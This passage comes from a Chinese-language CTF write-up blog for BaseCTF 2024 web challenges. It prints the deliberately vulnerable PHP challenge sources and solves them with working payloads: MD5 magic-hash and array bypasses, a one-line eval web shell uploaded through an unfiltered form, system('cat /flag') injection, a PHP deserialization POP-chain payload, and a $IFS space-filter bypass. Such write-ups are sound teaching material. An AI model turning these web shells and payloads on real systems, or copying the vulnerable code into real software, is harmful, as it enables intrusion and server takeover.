invoke__">md5</span>(<span class="variable">$password2</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;再看看啊，马上绕过嘞！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;错啦错啦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;没看到参数呐&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​第一层要求4个参数都存在，GET传入<code>name=1&amp;name2=2</code>，POST传入<code>password=1&amp;password2=2</code>。</p><p>​第二层要求name与password不同，但MD5后相同，注意到是双等号，即弱比较，利用0e漏洞绕过，在php中的弱比较中，会把0e开头且后面全为数字的字符串视为科学计数法，即0e123 &#x3D;&gt; 0^123 &#x3D;&gt; 0，利用这一点，当有两个不同值的MD5为e开头且后面全为数字的字符串，则会导致0&#x3D;&#x3D;0，绕过判断，修改GET传入参数为<code>name=240610708&amp;name2=2</code>，POST传入参数为<code>password=314282422&amp;password2=2</code>。</p><p>​类似的，有</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">240610708</span> </span><br><span class="line"><span class="number">0</span>e4620974319065090195<span class="number">62988736854</span></span><br><span class="line"></span><br><span class="line"><span class="number">314282422</span> </span><br><span class="line"><span class="number">0</span>e9909955048216994945<span class="number">20356953734</span></span><br><span class="line"> </span><br><span class="line"><span class="number">571579406</span> </span><br><span class="line"><span class="number">0</span>e972379832854295224<span class="number">118025748221</span></span><br><span class="line"> </span><br><span class="line">QLTHNDT </span><br><span class="line"><span class="number">0</span>e40596782540195537<span class="number">2549139051580</span></span><br><span class="line"> </span><br><span class="line">QNKCDZO </span><br><span class="line"><span class="number">0</span>e830400451993494058<span class="number">024219903391</span></span><br><span class="line"> </span><br><span class="line">EEIZDOI </span><br><span class="line"><span class="number">0</span>e78260136353929177<span class="number">9881938479162</span></span><br><span class="line"> </span><br><span class="line">TUFEPMC </span><br><span class="line"><span class="number">0</span>e839407194569345277<span class="number">863905212547</span></span><br><span class="line"> </span><br><span class="line">UTIPEZQ </span><br><span class="line"><span class="number">0</span>e3820987882312349546<span class="number">70291303879</span></span><br></pre></td></tr></table></figure><p>​第三层相比第二层多了一个等号，变为了强比较，无法再利用0e漏洞绕过，php中的MD5函数无法处理数组，当给它传入数组时，MD5函数会返回NULL，而NULL&#x3D;&#x3D;&#x3D;NULL，通过判断。</p><p>​最终GET传入参数为<code>name=240610708&amp;name2[]=1</code>，POST传入参数为<code>password=314282422&amp;password2[]=2</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>​快来上传你最喜欢的照片吧~ 等下,这个 php 后缀的照片是什么?</p><h3 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h3><ul><li>文件上传</li></ul><h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>​简单写一个最普通的一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​保存名字为normal.php，上传，无任何过滤，并且返回了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileerror</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$fileerror</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$filename</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$filetmp</span>, <span class="variable">$destination</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;File uploaded successfully&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Error uploading file&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;上传你喜欢的图片吧！&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;上传！&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> === <span class="string">&#x27;.&#x27;</span> || <span class="variable">$file</span> === <span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;uploads/<span class="subst">$file</span>&#x27; style=\&quot;max-height: 200px;\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>​文件上传至uploads&#x2F;目录下，那么我们的木马就在uploads&#x2F;normal.php，用蚁剑连接<img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_week1_web_upload_1.png" alt="basectf2024_week1_web_upload_1"></p><p>​连接成功后访问&#x2F;flag文件获取flag</p><h2 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;"></a>喵喵喵´•ﻌ•&#96;</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>​小明在学习PHP的过程中发现，原来php也可以执行系统的命令，于是开始疯狂学习…..</p><h3 id="考点-5"><a href="#考点-5" class="headerlink" title="考点"></a>考点</h3><ul><li>命令执行</li></ul><h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>​题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;DT&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>​一个没有任何过滤的简单命令执行，GET传入<code>DT=system(&quot;cat /flag&quot;);</code>，注意不要忘记分号</p><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="官方WP-1"><a href="#官方WP-1" class="headerlink" title="官方WP"></a>官方WP</h2><p><a href="https://j0zr0js7k7j.feishu.cn/wiki/JQbiwKdvtiR49VkMj5RcmPvPn7c">https://j0zr0js7k7j.feishu.cn/wiki/JQbiwKdvtiR49VkMj5RcmPvPn7c</a></p><h2 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>​简单的反序列化入门，喵喵喵</p><h3 id="考点-6"><a href="#考点-6" class="headerlink" title="考点"></a>考点</h3><ul><li>php反序列化</li></ul><h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>​题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​先分析逻辑，思考如何构建利用链</p><p>​看到了MIsc类下的<code>getflag()</code>函数可以获取flag，这便是我们的最终目标</p><p>​怎样能调用它呢？注意到pwn类下的<code>$this-&gt;over-&gt;getflag();</code>，如果<code>$this-&gt;over</code>是MIsc类即可成功调用</p><p>​<code>$this-&gt;over-&gt;getflag();</code>在<code>__get()</code>魔术方法下，需要当访问不可访问或不存在的属性时触发</p><p>​观察发现re类的<code>$this-&gt;chu0-&gt;$nononono;</code>访问了不存在的<code>$nononono</code>，我们接下来就需要触发<code>__toString()</code>魔术方法</p><p>​web类的<code>echo &quot;lalalla&quot;.$this-&gt;kw;</code>存在字符串拼接，可触发<code>__toString()</code>魔术方法，而<code>__wakeup()</code>是一个自动启动的方法，当反序列化后变化触发，由此思考结束，利用链为</p><p>​<code>web-&gt;__wakeup()  =&gt;  re-&gt;__toString()  =&gt;  pwn-&gt;__get($name)  =&gt;  Misc-&gt;getflag()</code></p><p>​去除掉无用的代码，生成payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">re</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">pwn</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Misc</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;kw = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;chu0 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;dusk = <span class="string">&quot;gods&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;over = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​得到payload：<code>O:3:&quot;web&quot;:1:&#123;s:2:&quot;kw&quot;;O:2:&quot;re&quot;:1:&#123;s:4:&quot;chu0&quot;;O:3:&quot;pwn&quot;:2:&#123;s:4:&quot;dusk&quot;;s:4:&quot;gods&quot;;s:4:&quot;over&quot;;O:4:&quot;Misc&quot;:0:&#123;&#125;&#125;&#125;&#125;</code>，GET传入ser即可</p><h2 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>​RCEisreallingamazingwithoutaspacesoyoushouldfindoutawaytoreplacespace</p><h3 id="考点-7"><a href="#考点-7" class="headerlink" title="考点"></a>考点</h3><ul><li>命令执行</li></ul><h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>​题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="comment">// check if space is present in the command</span></span><br><span class="line"><span class="comment">// use of preg_match to check if space is present in the command</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\s/&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Space not allowed in command&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// execute the command</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>​简单审计代码发现，仅过滤了空格，当检测到空格时程序中断</p><p>​使用$IFS代替空格即可，即POST传入<code>cmd=cat$IFS/flag</code></p><p>​IFS是Shell命令中的变量，表示 Internal Field Separator （内部字段分隔符）,<code>$IFS</code>默认是空字符(空格Space、Tab、换行\n)</p><h2 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>​你已经学会反序列化了，接下来尝试手动构造 POP 链吧！</p><h3 id="考点-8"><a href="#考点-8" class="headerlink" title="考点"></a>考点</h3><ul><li>php反序列化</li></ul><h3 id="题解-8"><a href="#题解-8" class="headerlink" title="题解"></a>题解</h3><p>​题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sink</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$word</span> = <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Shark says:&#x27;</span> . <span class="variable language_">$this</span>-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$animal</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$sea_ani</span> = <span class="variable language_">$this</span>-&gt;animal;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="variable">$sea_ani</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 